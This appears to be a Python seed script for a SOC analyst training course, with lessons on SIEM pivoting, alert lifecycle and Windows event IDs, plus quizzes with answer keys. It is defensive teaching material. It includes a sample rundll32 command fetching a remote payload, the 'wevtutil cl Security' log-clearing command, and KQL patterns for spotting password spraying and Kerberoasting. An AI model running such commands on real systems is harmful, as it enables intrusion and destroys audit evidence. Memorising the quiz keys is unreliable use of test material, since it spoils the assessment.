    Note over L1,K: Step 3 — process context
    L1->>K: host:"WS-MKT-009" and user:"k.patel" and event.category:"process"<br/>and time >= 11:32
    K-->>L1: 11:46:53Z rundll32 spawned by OUTLOOK.EXE<br/>cmdline: rundll32 url.dll,OpenURL https://[redacted]/m.html

    Note over L1,K: Step 4-5 — file + hash spread
    L1->>K: event.category:"file" + temp dir writes
    K-->>L1: rad48F2A.tmp written, sha256 abc123...
    L1->>K: file.hash.sha256:"abc123..." and not host.name:"WS-MKT-009"
    K-->>L1: same hash on WS-MKT-014 22min later — second host involved

    L1->>ION: case timeline + IOCs + 6 pivot strings
    L1->>ION: closure_reason: escalated to L2 (phishing-team)
```

Six pivots in, the L1 has a story: *phishing email → Outlook spawned rundll32 to fetch a remote payload → payload dropped a file in Temp → the file (or its delivery mechanism) reached a second host*. The L1 escalates to L2 with all six query strings, the time window, and the implicated host/user/file IOCs in the case.

## Dashboards and saved searches: when to trust them

Dashboards are condensed views; saved searches are pre-baked queries. Both can mislead.

**Trustworthy when:**

- Owned by detection engineering, version-controlled, with a documented purpose
- The time range is **explicit** (the panel header shows "last 24h", not relying on the page-level picker silently)
- The index pattern matches the question (an alert dashboard pulling from `winlogbeat-*` won't show Linux events)
- Filters are visible and the analyst can read them

**Misleading when:**

- The dashboard inherits the page-level time picker but the question requires a different window
- The saved search has a hard-coded filter that excludes the case-relevant data (a detection-engineering saved search may exclude `host.name : "DC-01"` because of historical noise; the analyst doesn't see this and reasons "there is no DC activity")
- The index pattern drifted (a panel pointing at `winlogbeat-7.*` after the cluster upgraded to 8.x will silently return zero)
- The visualisation rounds (a "top 10 failed-logon source IPs" pie chart hides ranks 11+; a brute-force from rank 11 is invisible)

**Rule for L1:** dashboards are good for *spotting trends*, bad for *answering specific questions about a single alert*. When the case asks *"what happened on host X at time T"*, go to Discover. When the shift handoff asks *"is the failed-logon rate normal"*, look at the dashboard.

## Worked example — when a dashboard hides the answer

L1 sees ION case *"spike in failed logons"* and opens the failed-logon dashboard. The trend panel shows flat. They check Discover with the case's specific query and find a 30× spike concentrated on one host. **The dashboard's panel aggregates fleet-wide; the spike on one host is invisible against the fleet baseline.** The L1 documents this in the case (*"dashboard fleet-aggregate masks per-host spike"*) and uses the per-host Discover query as authoritative.

## Alert lifecycle in the SIEM and ION

An alert is a long-lived object. Its state machine in Elastic Security and ION:

```mermaid
stateDiagram-v2
    [*] --> Open
    Open --> Acknowledged: L1 picks up
    Acknowledged --> InProgress: triage starts
    InProgress --> Closed_Resolved: closure reason set
    InProgress --> Closed_Escalated: L2 handoff
    Closed_Resolved --> Reopened: new evidence
    Closed_Escalated --> InProgress: L2 returns
    Reopened --> InProgress
    Closed_Resolved --> [*]
    Closed_Escalated --> [*]
```

- **Open / new** — Just fired. ION has just created the case.
- **Acknowledged** — An L1 has picked it up. ION moves the case to "in-progress".
- **In-progress** — Active triage. Analyst comments accumulate; pivots are saved.
- **Closed (resolved)** — Triage complete. ION requires a `CaseClosureReason` (true_positive / benign_true_positive / false_positive / duplicate / insufficient_data — see Module 1).
- **Closed (escalated)** — L1 hands off to L2. The case persists; ION assigns it to the L2 queue.

Every transition is auditable. **Comments in ION are first-class** — they're the thread future-you and future-L2 will read.

A good comment includes: (1) the pivot you ran, verbatim, (2) what you found, (3) why you concluded what you did. A bad comment: *"looks fine, closing"*.

ION-specific: closing with a `CaseClosureReason` feeds the **AIFeedback ledger** and the per-template scorecard. Sloppy reasons skew the Tier-1 training data Bob (the AI analyst service user) consumes for tuning proposals. **L1's discipline on closure-reason matters beyond the immediate case.**

The dual-write problem: if an analyst closes an alert in Kibana Security but ION still shows the case open (or vice versa), the synchronisation is broken. **Standard L1 protocol is to drive state from ION** (the case-management system of record) and let ION's connector update Kibana. Manual closure in Kibana can desync — escalate if you have to do it.

## Worked example — a clean handoff comment

Case `CRIT-2026-04-118`. L1 closure-comment template:

```
Investigated 11:32-12:05 UTC.
Alert: outbound to 185.220.101.7 from WS-MKT-009.
Pivots run:
  1. destination.ip : "185.220.101.7"  -> 1 host, 2 events
  2. user @11:32 logon -> k.patel
  3. parent of rundll32 -> OUTLOOK.EXE (rundll32 url.dll,OpenURL ...)
  4. file write Temp\\rad48F2A.tmp, sha256 <hash>
  5. same hash on WS-MKT-014 @12:09
Conclusion: phishing -> Outlook -> rundll32 dropper, second host involved.
Escalating to L2 for containment + email-source investigation.
Closure reason: escalated (L2 assignment: phishing-team).
```

This comment carries forward the timeline, the verbatim pivots, the IOCs, and the escalation reason. **L2 starts from a hot trail, not cold.**

## Glossary

- **Anchor IOC** — The single indicator that opens the pivot chain (IP, hash, user, process, host)
- **Pivot** — Moving from one query result to a follow-up query that uses a value from the result
- **Cluster (investigation)** — A coherent expansion across host/user/process/network/file axes
- **Saved search** — A stored Discover query (index pattern, KQL, filters, columns)
- **Dashboard panel** — A visualisation backed by a saved search or Lens query
- **Time picker** — Kibana's range selector; controls the implicit `@timestamp` filter at page or panel level
- **Index pattern drift** — When a panel's index pattern stops matching the live indices
- **Alert state machine** — Open → Acknowledged → In-progress → Closed (resolved | escalated)
- **`CaseClosureReason`** — ION's pinned enum for reasons a case is closed; load-bearing for AIFeedback
- **AIFeedback ledger** — ION's per-template scorecard table tracking closure outcomes vs alert prompt
- **Bob** — ION's AI-analyst service user that consumes feedback for tuning proposals
- **Lateral movement** — Adversary moving from one host/user to another within the environment
- **Handoff comment** — Closure comment that carries the case timeline + IOCs forward to L2

## Further reading

- Elastic Security alerts and cases: https://www.elastic.co/guide/en/security/current/alerts-ui-manage.html
- Elastic Security cases workflow: https://www.elastic.co/guide/en/security/current/cases-overview.html
- MITRE ATT&CK Lateral Movement tactic: https://attack.mitre.org/tactics/TA0008/
- BTL1 syllabus: SIEM Domain — Investigation Workflow and Pivoting
- SANS GCIH KSA: Domain 4 — Incident Handling Process
""",
    )

    # Quiz on Lesson 4
    m2l4q = _add_lesson(
        session, mod2, order=8,
        title="Pivots + lifecycle — quiz",
        lesson_type=LessonType.QUIZ, duration_min=8,
        content_md="Six questions on the cluster pattern, dashboard pitfalls, and alert lifecycle in ION.",
    )
    _add_q(session, m2l4q, order=1, kind=QuestionKind.SINGLE,
        stem_md="What is the **first pivot** in the cluster pattern after the anchor IOC?",
        options=[
            {"value": "hash", "label": "File hashes"},
            {"value": "host", "label": "Host context"},
            {"value": "dns", "label": "DNS queries"},
            {"value": "auth_fail", "label": "Authentication failures"},
        ],
        correct="host",
        explanation_md="Host context anchors everything else (without a host you can't meaningfully pivot to user, process, or network for that host).",
        points=2,
    )
    _add_q(session, m2l4q, order=2, kind=QuestionKind.MULTI,
        stem_md="A dashboard panel shows 0 events. Which are plausible **non-attacker** explanations? Pick all that apply.",
        options=[
            {"value": "time", "label": "Time range mismatch with the page picker"},
            {"value": "filter", "label": "Filter inherited from the dashboard excludes the relevant index"},
            {"value": "drift", "label": "Index pattern drift after a stack upgrade"},
            {"value": "saved", "label": "Saved-search hard-coded to exclude a host"},
            {"value": "rule_off", "label": "Detection rule disabled"},
        ],
        correct=["time", "filter", "drift", "saved"],
        explanation_md="Detection-rule state doesn't directly affect a Discover-backed dashboard panel — it would affect alert dashboards specifically, and even there it would show *fewer* alerts but still a non-zero historical count.",
        points=3,
    )
    _add_q(session, m2l4q, order=3, kind=QuestionKind.TRUEFALSE,
        stem_md="An L1 closing a Kibana alert manually is the canonical way to close an ION case.",
        options=[{"value": "true", "label": "True"}, {"value": "false", "label": "False"}],
        correct="false",
        explanation_md="**False.** ION is the case-management system of record; closure is driven from ION and ION's connector updates Kibana. Manual Kibana closure risks desync.",
        points=1,
    )
    _add_q(session, m2l4q, order=4, kind=QuestionKind.SHORTANSWER,
        stem_md="Name three IOCs you would extract from a process-creation alert and carry into the case timeline.",
        options=None,
        correct=["host.name, user.name, process.name", "host, user, process, hash", "host.name, process.command_line, file.hash.sha256", "user, process, parent process"],
        explanation_md="Acceptable: `host.name`, `user.name`, `process.name` / `process.command_line`, `process.hash.sha256`, `process.parent.name`, source/destination IP if a network event was correlated. Any three.",
        points=2,
    )
    _add_q(session, m2l4q, order=5, kind=QuestionKind.SINGLE,
        stem_md="A `CaseClosureReason` of **false_positive** is appropriate when:",
        options=[
            {"value": "no_events", "label": "The alert fired but the analyst couldn't find the underlying events"},
            {"value": "btp", "label": "The alert reflects benign expected activity (e.g. authorised admin tool)"},
            {"value": "rule_wrong", "label": "The detection rule's logic does not actually identify malicious behaviour as designed"},
            {"value": "dup", "label": "A duplicate of an earlier case"},
        ],
        correct="rule_wrong",
        explanation_md="A *false positive* specifically means the rule's detection is wrong (the activity it flags isn't actually what the rule claims to detect). 'Benign expected activity' is a *benign true positive*. 'Duplicate' is its own closure reason. Distinguishing these is what the AIFeedback ledger relies on.",
        points=2,
    )
    _add_q(session, m2l4q, order=6, kind=QuestionKind.SHORTANSWER,
        stem_md="Why does the quality of L1 closure comments matter beyond the immediate case in ION?",
        options=None,
        correct=["AIFeedback ledger", "feeds AIFeedback", "scorecard", "bob tuning", "training data for bob", "feeds the per-template scorecard"],
        explanation_md="Closure comments and reasons feed the AIFeedback ledger and per-template scorecard, which in turn feed Tier-1 training data and Bob's tuning proposals. Sloppy or inconsistent closure reasons degrade the AI-analyst service's recommendations and the per-template prompt-quality metrics.",
        points=2,
    )

    # ── Module 3 — Windows Event Logs (v0.11.6) ──────────────────────────
    # Authored at BTL1/SANS depth from research-agent dossier. ECS-first
    # throughout; pairs every event ID discussion with the ATT&CK
    # technique(s) it maps to.
    mod3 = _add_module(
        session, course, order=3,
        title="Windows Event Logs",
        description_md=(
            "The single richest endpoint telemetry source on a tier-1 shift. "
            "Channels and providers, the high-value Security event IDs, "
            "Sysmon's enriched telemetry, and the canonical attacker patterns "
            "you triage daily — pass-the-hash, persistence, suspicious service "
            "installs, Office spawning shells, DNS exfiltration."
        ),
        estimated_minutes=200,
    )

    # Lesson 3.1 — architecture
    m3l1 = _add_lesson(
        session, mod3, order=1,
        title="The Windows logging architecture and how it reaches ION",
        lesson_type=LessonType.READING, duration_min=22,
        content_md="""
> **Learning objectives.** By the end of this lesson you'll be able to:
> 1. Identify the standard Windows event channels (Security, System, Application, Setup, Forwarded Events) and the role each plays
> 2. Explain the provider/channel relationship and how the same event can be authored by different providers
> 3. Describe how `winlogbeat` reads EVTX channels and ships them to Elastic with ECS-compliant field names
> 4. Define Windows Event Forwarding (WEF), distinguish it from agent-based shipping, and recognise forwarded events in ION
> 5. Map a `winlog.channel` value to the ION/Elastic index pattern an analyst should query
>
> **Prerequisites.** Module 2 *SIEM Fundamentals* completed.

## Channels, providers, and the EVTX format

Modern Windows (Vista and later) uses the **Windows Event Log** service to host log data in **channels**. A channel is a named stream of events — `Security`, `System`, `Application`, `Setup`, and `Forwarded Events` are the five default *Windows Logs* channels every workstation and server has. Beyond those, hundreds of *Applications and Services Logs* channels exist under the `Microsoft-Windows-*` namespace: `Microsoft-Windows-Sysmon/Operational`, `Microsoft-Windows-PowerShell/Operational`, `Microsoft-Windows-TaskScheduler/Operational`, and so on. Each channel is backed by an EVTX file (`.evtx`) on disk under `%SystemRoot%\\System32\\Winevt\\Logs\\`.

Every event has a **provider** — the component that authored the event — and a **channel** — the stream the event was written to. The provider for a 4624 logon event is `Microsoft-Windows-Security-Auditing`; the channel is `Security`. The provider for a Sysmon process-create is `Microsoft-Windows-Sysmon`; the channel is `Microsoft-Windows-Sysmon/Operational`. The same provider can write to multiple channels (operational, analytic, debug); the same channel can host events from multiple providers. In ION you'll see both surfaced as `winlog.provider_name` and `winlog.channel` in ECS.

The EVTX format itself is binary, structured, and self-describing. Events have a fixed `System` block (TimeCreated, EventRecordID, EventID, Computer, SecurityID) and a variable `EventData` block whose schema depends on the EventID. This is why field names like `winlog.event_data.TargetUserName` and `winlog.event_data.LogonType` exist — the `event_data` map is the per-EventID payload, and the keys are the names defined in the provider's manifest.

```mermaid
flowchart LR
    subgraph Endpoint[Windows Endpoint]
        Provider1[Provider: Security-Auditing]
        Provider2[Provider: Sysmon]
        Provider3[Provider: PowerShell]
        Channel1[Channel: Security]
        Channel2[Channel: Sysmon/Operational]
        Channel3[Channel: PowerShell/Operational]
        EVTX[(EVTX files on disk)]
        Provider1 --> Channel1
        Provider2 --> Channel2
        Provider3 --> Channel3
        Channel1 --> EVTX
        Channel2 --> EVTX
        Channel3 --> EVTX
    end
    EVTX --> Winlogbeat
    Winlogbeat -->|ECS-normalised JSON| Elastic[(Elasticsearch winlogbeat-*)]
    Elastic --> ION[ION Triage UI]
```

**Worked example.** A successful interactive logon at the console of `WS-FINANCE-04` produces an event written by provider `Microsoft-Windows-Security-Auditing` to the `Security` channel with EventID `4624`. After winlogbeat ships it to Elastic, the document will have `winlog.provider_name: "Microsoft-Windows-Security-Auditing"`, `winlog.channel: "Security"`, `event.code: "4624"`, `winlog.event_data.LogonType: "2"`, `winlog.event_data.TargetUserName: "alice"`, and ECS-mirrored fields `user.name: "alice"` and `host.name: "ws-finance-04"`.

## Winlogbeat, ECS, and channel-to-index mapping

`winlogbeat` is the Elastic-published agent that subscribes to Windows event channels via the EvtSubscribe API and forwards records to Elasticsearch. In ION's deployment, the default `winlogbeat.yml` subscribes to at minimum: `Application`, `Security`, `System`, `Microsoft-Windows-Sysmon/Operational`, `Microsoft-Windows-PowerShell/Operational`, `Windows PowerShell`, `ForwardedEvents`. Each subscribed channel becomes a stream of documents indexed under the `winlogbeat-*` data view.

Winlogbeat ships a fixed module set that performs **ECS normalisation** — it remaps native Windows field names to the Elastic Common Schema. So `EventData.SubjectUserName` becomes both `winlog.event_data.SubjectUserName` (preserved raw) and `user.name` (ECS-mapped). `Computer` becomes `host.name`. The TimeCreated SystemTime becomes `@timestamp`. `IpAddress` from a 4624 becomes `source.ip` when the LogonType implies a network logon. **Always prefer ECS field names in queries** because they are stable across data sources, but fall back to `winlog.event_data.*` when an attribute hasn't been ECS-promoted.

In ION, channels do **not** get separate indices — every winlogbeat document lands in the same daily index (e.g. `winlogbeat-8.11.0-2026.04.23`) and is distinguished by `winlog.channel`. So a query for *"all Sysmon events on this host"* is `host.name : "ws-finance-04" and winlog.channel : "Microsoft-Windows-Sysmon/Operational"`, not a different index.

### ECS field translation table

| Native Windows field | winlogbeat raw field | ECS-mapped field |
| --- | --- | --- |
| `EventData.SubjectUserName` | `winlog.event_data.SubjectUserName` | `user.name` |
| `EventData.IpAddress` (on 4624) | `winlog.event_data.IpAddress` | `source.ip` |
| `EventData.TargetUserName` | `winlog.event_data.TargetUserName` | `user.target.name` |
| `EventData.NewProcessName` (4688) | `winlog.event_data.NewProcessName` | `process.executable` |
| `EventData.CommandLine` (4688/Sysmon 1) | `winlog.event_data.CommandLine` | `process.command_line` |
| `Computer` | `winlog.computer_name` | `host.name` |
| `EventID` | `winlog.event_id` | `event.code` |

## Windows Event Forwarding (WEF)

Native Windows event logs are local — they live on the host that generated them. Two strategies exist for centralising them:

1. **Agent-based shipping** (winlogbeat, Splunk UF, NXLog) — each endpoint runs a process that reads its own EVTX and pushes records out
2. **Windows Event Forwarding (WEF)** — a Microsoft-native mechanism where a *collector* server subscribes to events on remote *source* machines via WinRM, and the source pushes matching events to the collector's `ForwardedEvents` channel

WEF subscriptions are configured via Group Policy or `wecutil` and identified by **subscription names** (e.g. `Security_Logs_Subscription`). Source-initiated subscriptions are the common production pattern — endpoints push to the collector after picking up GPO config — and are ideal for high-security zones where you can't run a third-party agent on every workstation. The downside: you need WinRM/HTTPS plumbing, certificate trust, and tuning of the XPath subscription queries to avoid forwarding everything.

```mermaid
flowchart LR
    subgraph Sources[Source Endpoints]
        S1[WS-001]
        S2[WS-002]
        S3[WS-003]
    end
    subgraph Collector[WEF Collector]
        FwdChannel[Channel: ForwardedEvents]
        WLB[winlogbeat]
    end
    S1 -->|WinRM HTTPS push| FwdChannel
    S2 -->|WinRM HTTPS push| FwdChannel
    S3 -->|WinRM HTTPS push| FwdChannel
    FwdChannel --> WLB
    WLB -->|host.name preserved| Elastic[(winlogbeat-*)]
```

In ION, forwarded events arrive in the collector's `ForwardedEvents` channel. Winlogbeat then ships them, and the document has `winlog.channel: "ForwardedEvents"` plus a preserved `winlog.computer_name` pointing at the *original source host* (not the collector). When triaging, **an L1 must read `winlog.computer_name` or `host.name` carefully** — the host that *generated* the event is what matters for the investigation, not the collector that relayed it.

## KQL snippets

```kql
winlog.channel : "Security" and event.code : "4624"
```
- `winlog.channel` filters to the Security channel — discards Sysmon, PowerShell, System
- `event.code` is the ECS-mapped EventID; using `event.code` (string) is preferred over `winlog.event_id` (integer) for stable cross-version queries

```kql
winlog.channel : "ForwardedEvents" and host.name : "dc01.corp.local"
```
- Filters to events that came through WEF specifically
- `host.name` here is the *source* host (the endpoint that generated the event), preserved by winlogbeat — not the collector

```kql
event.code : "4624" and winlog.event_data.LogonType : "10" and not user.name : "alice"
```
- `LogonType 10` is RemoteInteractive (RDP)
- The exclusion of `alice` shows pivoting by removing a known-good user during triage

## Glossary

- **Channel** — a named log stream Windows uses to organise events (Security, System, Sysmon/Operational, etc.)
- **Provider** — the component that authors events (e.g. `Microsoft-Windows-Security-Auditing`)
- **EVTX** — the binary file format used by Windows to store event logs on disk under `%SystemRoot%\\System32\\Winevt\\Logs\\`
- **winlogbeat** — Elastic's official agent for shipping Windows event channels with ECS normalisation
- **WEF** — Windows Event Forwarding; native Microsoft mechanism to centralise events to a collector via WinRM
- **Collector** — the Windows server that receives forwarded events from sources and writes them to its `ForwardedEvents` channel
- **Subscription** — a WEF configuration object defining which events from which sources to collect, expressed as an XPath query
- **EventData** — the per-EventID payload block in an EVTX record, surfaced as `winlog.event_data.*`
- **System block** — the fixed-schema header on every EVTX record (TimeCreated, EventID, Computer, etc.)
- **WinRM** — Windows Remote Management; the WS-Management transport WEF uses
- **Source-initiated subscription** — WEF mode where endpoints push to the collector based on GPO; standard production pattern

## Further reading

- Microsoft Learn — Windows Event Log overview: https://learn.microsoft.com/en-us/windows/win32/wes/windows-event-log
- Microsoft Learn — Windows Event Forwarding for intrusion detection: https://learn.microsoft.com/en-us/windows/security/threat-protection/use-windows-event-forwarding-to-assist-in-intrusion-detection
- Elastic — Winlogbeat reference: https://www.elastic.co/guide/en/beats/winlogbeat/current/index.html
- Elastic Common Schema — Field reference: https://www.elastic.co/guide/en/ecs/current/ecs-field-reference.html
- BTL1 — Windows Event Logs domain
""",
    )
    m3l1q = _add_lesson(
        session, mod3, order=2, title="Architecture quiz",
        lesson_type=LessonType.QUIZ, duration_min=8,
        content_md="Five questions on channels/providers, winlogbeat, ECS mapping, and WEF.",
    )
    _add_q(session, m3l1q, order=1, kind=QuestionKind.SINGLE,
        stem_md="Which Windows component is the **provider** for a Sysmon process-create event?",
        options=[
            {"value": "security_auditing", "label": "Microsoft-Windows-Security-Auditing"},
            {"value": "sysmon", "label": "Microsoft-Windows-Sysmon"},
            {"value": "eventlog", "label": "Microsoft-Windows-Eventlog"},
            {"value": "winlogbeat", "label": "winlogbeat"},
        ],
        correct="sysmon",
        explanation_md="The provider is the component that authored the event. Sysmon authors its own events under the `Microsoft-Windows-Sysmon` provider into the `Microsoft-Windows-Sysmon/Operational` channel.",
        points=2,
    )
    _add_q(session, m3l1q, order=2, kind=QuestionKind.SINGLE,
        stem_md="A document in ION has `winlog.channel: \"ForwardedEvents\"` and `host.name: \"ws-hr-12\"`. Which host generated the original event?",
        options=[
            {"value": "collector", "label": "The WEF collector"},
            {"value": "source", "label": "ws-hr-12"},
            {"value": "ingest", "label": "The Elasticsearch ingest node"},
            {"value": "winlogbeat_host", "label": "The winlogbeat host"},
        ],
        correct="source",
        explanation_md="Winlogbeat preserves the source host's name in `host.name` (and `winlog.computer_name`) when shipping forwarded events. The `ForwardedEvents` channel is just the collection point on the collector; the originating host is `ws-hr-12`.",
        points=2,
    )
    _add_q(session, m3l1q, order=3, kind=QuestionKind.TRUEFALSE,
        stem_md="Each Windows event channel maps to a separate Elasticsearch index in a default ION winlogbeat deployment.",
        options=[{"value": "true", "label": "True"}, {"value": "false", "label": "False"}],
        correct="false",
        explanation_md="**False.** All winlogbeat-shipped channels land in the same `winlogbeat-*` daily index. They are distinguished by the `winlog.channel` field, not by index name.",
        points=1,
    )
    _add_q(session, m3l1q, order=4, kind=QuestionKind.MULTI,
        stem_md="Which of the following are true about ECS field mapping in winlogbeat?",
        options=[
            {"value": "target_user", "label": "winlog.event_data.TargetUserName becomes user.target.name"},
            {"value": "ecs_stable", "label": "ECS field names are stable across data sources whereas winlog.event_data.* is per-EventID"},
            {"value": "computer_event", "label": "The native Computer field maps to event.host"},
            {"value": "ip_source", "label": "EventData.IpAddress on a 4624 maps to source.ip when the logon type implies a network source"},
        ],
        correct=["target_user", "ecs_stable", "ip_source"],
        explanation_md="The ECS host field is `host.name`, not `event.host` — so the Computer-to-event.host claim is wrong. The other three are correct.",
        points=3,
    )
    _add_q(session, m3l1q, order=5, kind=QuestionKind.SHORTANSWER,
        stem_md="An analyst writes the query `winlog.event_id : 4624`. Why might this fail to return results, and what's the safer field to use?",
        options=None,
        correct=["event.code", "use event.code", "event.code is keyword", "event.code instead", "switch to event.code"],
        explanation_md="`winlog.event_id` is sometimes indexed as keyword, sometimes as number, depending on winlogbeat version and pipeline; comparing a number to a keyword field can silently return zero hits. The ECS-mapped `event.code` is consistently a keyword string and should be the default.",
        points=2,
    )

    # Lesson 3.2 — Security event IDs
    m3l2 = _add_lesson(
        session, mod3, order=3,
        title="High-value Security channel event IDs",
        lesson_type=LessonType.READING, duration_min=26,
        content_md="""
> **Learning objectives.** By the end of this lesson you'll be able to:
> 1. Identify the 15-20 Security channel event IDs L1 must recognise on sight, and recall what each means
> 2. Decode the LogonType field on 4624/4625 events and reason about logon context
> 3. Distinguish Kerberos events (4768/4769) from NTLM events (4776) and identify the failure-code fields
> 4. Recognise account- and group-management events (4720/4722/4724/4732/4738/4756) as a triage cluster
> 5. Map every event ID covered to one or more MITRE ATT&CK techniques

## Authentication events: the 4624 / 4625 / 4634 / 4647 / 4648 / 4672 cluster

These six events are the bread and butter of identity-driven triage.

A successful logon writes **4624 — An account was successfully logged on**. The most important field on a 4624 is `LogonType` (`winlog.event_data.LogonType`):

| LogonType | Name | Meaning |
| --- | --- | --- |
| 2 | Interactive | At-keyboard / console logon |
| 3 | Network | SMB, IPC$, network share — the **pass-the-hash favourite** |
| 4 | Batch | Scheduled task |
| 5 | Service | Service account starting a service |
| 7 | Unlock | Workstation unlock |
| 8 | NetworkCleartext | Network logon with cleartext password (basic auth, IIS) |
| 9 | NewCredentials | runas /netonly |
| 10 | RemoteInteractive | RDP |
| 11 | CachedInteractive | Cached domain credentials (laptop offline) |

A failed logon writes **4625 — An account failed to log on** with the same `LogonType` field plus a `Status` and `SubStatus`:

- `0xC0000064` — user does not exist
- `0xC000006A` — bad password
- `0xC0000234` — account locked
- `0xC0000072` — account disabled
- `0xC0000193` — account expired

A burst of 4625s with `SubStatus 0xC000006A` from one source IP against many usernames is **password spraying**. A burst against one username from many IPs is targeted brute force.

**4634 — An account was logged off** and **4647 — User initiated logoff** complement 4624: 4647 is specifically a user clicking sign-out, while 4634 fires for service/network session teardowns. **4648 — A logon was attempted using explicit credentials** is the `runas` event — a process tried to authenticate as someone other than its current security context. 4648 with a high-privilege target user is a strong signal of credential-laundering or admin escalation.

**4672 — Special privileges assigned to new logon** fires whenever a logon receives sensitive privileges (`SeDebugPrivilege`, `SeTcbPrivilege`, `SeBackupPrivilege`, etc.). Practically, every administrator logon produces a 4672 immediately after the corresponding 4624. A 4672 for a user account that *should not* be admin is a fast-pivot signal.

**ATT&CK mapping.** 4624/4625 → **T1078** (Valid Accounts), **T1110** (Brute Force), **T1021** (Remote Services). 4648 → **T1078**, **T1550** (Use Alternate Authentication Material). 4672 → **T1078.003** (Local Accounts) when on a local privileged account.

```mermaid
flowchart TD
    Logon[User attempts logon] --> Success{Auth result}
    Success -->|Pass| E4624[4624 logged on]
    Success -->|Fail| E4625[4625 failed]
    E4624 --> Privs{Has admin privs?}
    Privs -->|Yes| E4672[4672 special privs assigned]
    Privs -->|No| Done[Standard session]
    E4624 --> ExplicitCreds{runas / explicit creds?}
    ExplicitCreds -->|Yes| E4648[4648 explicit cred logon]
    Done --> Logoff{Session ends}
    Logoff -->|User-initiated| E4647[4647 user logoff]
    Logoff -->|System teardown| E4634[4634 logoff]
```

## Account, group, and Kerberos/NTLM events

When an attacker establishes persistence, they often **create a user and add it to a privileged group**. The events to memorise as a cluster:

- **4720** — A user account was created
- **4722** — A user account was enabled
- **4724** — An attempt was made to reset an account's password (admin reset, not user-driven)
- **4738** — A user account was changed
- **4732** — A member was added to a security-enabled local group
- **4756** — A member was added to a security-enabled universal group (and **4728** for global groups)

A 4720 followed within minutes by a 4732 against the local Administrators group (`TargetSid` ending in `-544`) is the canonical local-admin-persistence signature. Look for the `SubjectUserName` (who did it) and `TargetUserName` (the account being acted on).

### Kerberos and NTLM authentication on the DC

Three domain-controller-only events:

- **4768 — A Kerberos authentication ticket (TGT) was requested** (the AS-REQ). Fields: `TargetUserName`, `IpAddress`, `TicketEncryptionType` (`0x12` = AES256, `0x17` = RC4 — RC4 is the **Kerberoasting tell**), `Status` (`0x6` = client unknown, `0x12` = client locked, `0x18` = bad password)
- **4769 — A Kerberos service ticket was requested** (the TGS-REQ). Fields: `TargetUserName` (the *service account* the ticket targets, e.g. `MSSQLSVC/sql01`), `ServiceName`, `TicketEncryptionType` (RC4 here is **Kerberoasting**; AES is normal), `Status`
- **4776 — The computer attempted to validate the credentials for an account** — NTLM authentication. Fields: `TargetUserName`, `Workstation` (source NetBIOS name), `Status` (same family as 4625)

**4769 with `TicketEncryptionType: "0x17"` (RC4) for a service account** is the textbook Kerberoasting indicator (**T1558.003**) — attackers force RC4 because it's offline-crackable.

```mermaid
sequenceDiagram
    participant Client
    participant DC as Domain Controller
    participant FileSrv as File Server
    Client->>DC: AS-REQ (request TGT)
    DC->>DC: Log 4768 (TGT requested)
    DC-->>Client: TGT
    Client->>DC: TGS-REQ for cifs/fileserver
    DC->>DC: Log 4769 (Service ticket requested)
    DC-->>Client: TGS
    Client->>FileSrv: SMB session with TGS
    FileSrv->>FileSrv: Log 4624 LogonType 3
    FileSrv->>FileSrv: Log 5140 share accessed
```

### Other high-value Security events

- **5140 — A network share object was accessed** — fires when a user accesses an SMB share. Fields: `ShareName`, `ShareLocalPath`, `IpAddress`
- **5145 — A network share object was checked** — much noisier, fires per-file. Filter aggressively
- **1102 — The audit log was cleared** — single highest-priority event in the entire Security channel. Fires when someone runs `wevtutil cl Security` or otherwise clears the log. **T1070.001**. *Always* escalate
- **7045 — A service was installed in the system** (System channel, technically). Fields: `ServiceName`, `ImagePath`, `ServiceType`, `StartType`. Suspicious `ImagePath` patterns: temp directories, double extensions, base64-laden powershell
- **4688 — A new process has been created** — the native equivalent of Sysmon Event 1, but only includes `CommandLine` if the *Include command line in process creation events* GPO is enabled. Without the GPO, 4688 is much less useful than Sysmon 1

## A worked triage walkthrough

**Scenario.** An ION alert fires: *"10+ failed logons from one source IP in 60 seconds."* The KQL backing it:

```kql
event.code : "4625" and source.ip : "10.42.18.91"
```

The 12 hits all show:

- `winlog.event_data.LogonType: "3"` — network logon
- `winlog.event_data.SubStatus: "0xC000006A"` — bad password
- `winlog.event_data.TargetUserName: "alice", "bob", "carol", ...` — twelve different usernames
- `source.ip: "10.42.18.91"` — all from the same host

**Interpretation.** One source IP, one bad-password substatus, twelve different usernames, all over network logon (SMB or similar). This is **password spraying** (T1110.003). The attacker is iterating usernames against (probably) one weak password.

**Pivot 1 — did any spray succeed?**

```kql
event.code : "4624" and source.ip : "10.42.18.91" and winlog.event_data.LogonType : "3"
```

If you see a 4624 from the same `source.ip` within the same window, that's the **compromised account**.

**Pivot 2 — what is `10.42.18.91`?** Cross-reference asset inventory and DHCP logs. If it's a domain-joined endpoint, the attacker has a foothold and is pivoting. If it's an unknown IP on the corporate VLAN, that's a rogue device.

**Pivot 3 — if a 4624 succeeded, follow up with:**

```kql
host.name : "ws-finance-04" and event.code : ("4624" or "4672" or "4688") and @timestamp >= "2026-04-23T14:00:00Z"
```

…to see what the attacker did after the successful logon.

**This pattern is the heart of L1.** Recognise the burst, classify the type (spray vs brute force), check for success, pivot to the source.

## KQL snippets with line-by-line commentary

```kql
event.code : "4625" and winlog.event_data.LogonType : "3" and winlog.event_data.SubStatus : "0xC000006A"
```
- Network logon (`LogonType 3`) failures specifically for bad password
- Excluding `0xC0000064` (user does not exist) reduces noise from username enumeration; this clause focuses on actual credential testing

```kql
event.code : "4769" and winlog.event_data.TicketEncryptionType : "0x17" and not winlog.event_data.TargetUserName : *$
```
- `0x17` is RC4-HMAC, which Kerberoasting tools force
- Excluding usernames ending in `$` filters out machine accounts (which legitimately use weaker encryption in some cases)

```kql
event.code : "1102"
```
- The simplest and most important query in this lesson. `1102` is *audit log cleared.* Anyone clearing the security audit log on a production system gets investigated — full stop

## Glossary

- **LogonType** — integer field on 4624/4625 indicating logon method (2=interactive, 3=network, 10=RDP, etc.)
- **SubStatus** — failure-detail code on 4625 (e.g. `0xC000006A` = bad password, `0xC0000064` = user not found)
- **TGT** — Kerberos Ticket-Granting Ticket; obtained via AS-REQ (logged 4768)
- **TGS** — Kerberos Ticket-Granting Service ticket; obtained via TGS-REQ (logged 4769)
- **Kerberoasting** — credential-access technique (T1558.003) requesting RC4 service tickets to crack offline
- **NTLM** — legacy challenge/response authentication; validation logged as 4776 on the validating DC
- **TicketEncryptionType** — Kerberos ticket cipher (`0x12`=AES256, `0x17`=RC4); RC4 on 4769 is the Kerberoasting tell
- **Special privileges** — sensitive Windows privileges (SeDebugPrivilege, SeBackupPrivilege, etc.) whose assignment fires 4672
